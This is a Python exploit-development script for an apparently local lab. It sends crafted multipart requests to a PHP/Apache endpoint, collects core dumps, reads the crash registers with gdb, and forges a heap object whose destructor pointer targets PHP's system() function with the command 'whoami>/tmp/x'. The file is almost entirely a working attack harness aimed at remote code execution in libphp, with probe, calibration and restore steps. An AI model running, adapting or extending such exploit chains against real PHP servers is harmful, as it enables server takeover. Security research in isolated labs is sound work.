#!/usr/bin/env python3
"""oom83: F-probe in AIM arms + ti flag fix (0x208 = DESTRUCTOR_CALLED).

oom82 verdict B: with valid TARGET at T[0], silence — dispatch never
happened. Two suspects: (1) F differs in AIM-armed boots (measure with
a DISTINCTIVE invalid pointer 0x5a5a5a5a5a5a at T[0] -> crash rdi tells
F exactly); (2) ti=0x108 was the wrong flag (WEAKLY_REFERENCED, not
DESTRUCTOR_CALLED=0x02 -> ti should be 0x208; with 0x108 the chain
would null-deref ce — which never happened).
Probe tile: T[0]=0x5a5a5a5a5a5a (invalid, distinctive), ti=0x208,
free_obj=MARKER. Outcomes:
  rdi=0x5a5a...        -> F=0 confirmed; ti flag next candidate
  rdi=other template   -> F moved; decode
  rip=MARKER           -> full dispatch reached free_obj (!)
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
MARKER = 0x414141414141
PROBE = 0x5a5a5a5a5a5a
STRIDE = 3584


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def build_tile(libphp_base, VA0, cal=False, window=None, ti=0x208,
               free_obj="marker"):
    T = bytearray(176)
    struct.pack_into("<IIII", T, 8, 1, ti, 1, 0)
    struct.pack_into("<Q", T, 32, VA0 + 152)
    struct.pack_into("<I", T, 52, 1)
    struct.pack_into("<QII", T, 88, VA0 + 112, 6, 0)
    struct.pack_into("<IIQ", T, 112, 1, 0x106, 0)
    struct.pack_into("<Q", T, 128, len(CMD))
    T[136:136 + len(CMD)] = CMD
    T[136 + len(CMD)] = 0
    fo = MARKER if free_obj == "marker" else (libphp_base + ZIF_SYSTEM)
    struct.pack_into("<QQ", T, 152, 0, fo)
    if cal:
        MK = struct.pack("<Q", MARKER)
        for off in (0, 32, 88, 160):
            T[off:off + 8] = MK
    elif window is not None:
        T[0:8] = struct.pack("<Q", window)
    return bytes(T)


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c83_%s" % tag, 240)
    sh("docker cp /tmp/c83_%s phpbuild:/tmp/c83_%s" % (tag, tag), 240)
    return "/tmp/c83_%s" % tag


def gdb_regs(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi rip\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    rd = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    rp = re.search(r"rip\s+0x([0-9a-f]+)", out)
    return (struct.pack("<Q", int(rd.group(1), 16)) if rd else None,
            int(rp.group(1), 16) if rp else None)


def core_pt_loads(data):
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    segs = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if struct.unpack_from("<I", data, o)[0] != 1:
            continue
        p_off, p_vaddr = struct.unpack_from("<QQ", data, o + 8)
        p_filesz = struct.unpack_from("<Q", data, o + 0x20)[0]
        if p_filesz:
            segs.append((p_vaddr, p_filesz, p_off))
    return segs


def core_va0(core_host, T_cal):
    data = open(core_host, "rb").read()
    segs = core_pt_loads(data)
    pat = T_cal[:16]
    pos = 0
    while True:
        i = data.find(pat, pos)
        if i < 0:
            return None
        for va, sz, off in segs:
            if off <= i < off + sz:
                return va + (i - off)
        pos = i + 1


print("=== oom83: AIM-arm F-probe (0x5a5a window, ti=0x208) ===", flush=True)
boot_core_env()
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
base = None
for ln in maps.splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
print("    libphp base = 0x%x" % base, flush=True)

# ---------- CAL: VA0 ----------
T_cal = build_tile(base, 0x1000, cal=True, ti=0x108)
print("[1] CAL warm (11)", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=T_cal))
VA0 = None
for fi in range(3):
    code, resp = post(P.build_attack(3400, 9200000 + fi * 100000, value_tile=T_cal))
    print("  cal-fire%d: %s" % (fi, code), flush=True)
    if code == "200":
        continue
    time.sleep(3)
    cb = fetch_core("cal%d" % fi)
    rdi8, rip = gdb_regs("c83_cal%d" % fi)
    if rdi8 is None:
        continue
    VA0 = core_va0(cb, T_cal)
    print("    rdi=%s rip=0x%x VA0=%s" % (rdi8.hex(), rip or 0, hex(VA0) if VA0 else None), flush=True)
    if VA0:
        break
if VA0 is None:
    print("[ABORT] no VA0", flush=True)
    sys.exit(1)

# ---------- PROBE arm: distinctive invalid window, ti=0x208 ----------
T_probe = build_tile(base, VA0, window=PROBE, ti=0x208, free_obj="marker")
print("[2] PROBE warm (11), window=0x%x ti=0x208" % PROBE, flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=T_probe))
print("[3] PROBE sacrifice@9200000 + finishers@9210000+4i", flush=True)
post(P.build_attack(3400, 9200000, value_tile=T_probe))
for fi in range(6):
    sb = 9210000 + fi * 4
    code, resp = post(P.build_attack(3400, sb, value_tile=T_probe))
    tag = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
    print("  probe-fire%d (%d): %s [%s]" % (fi, sb, code, tag), flush=True)
    if code != "200":
        time.sleep(3)
        cb2 = fetch_core("probe%d" % fi)
        rdi8, rip = gdb_regs("c83_probe%d" % fi)
        f = None
        if rdi8:
            d = T_probe * 2
            for k in range(176):
                if d[k:k + 8] == rdi8:
                    f = k
                    break
        print("    crash rdi=%s rip=0x%x F=%s" % (rdi8.hex() if rdi8 else "?", rip or 0, f), flush=True)
        if rip == MARKER:
            print("*** DISPATCH REACHED free_obj — chain works! ***", flush=True)
        elif rdi8 == struct.pack("<Q", PROBE):
            print(">>> F=0 CONFIRMED in AIM arms; blocker was ti/validity <<<", flush=True)
        break

print("[4] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
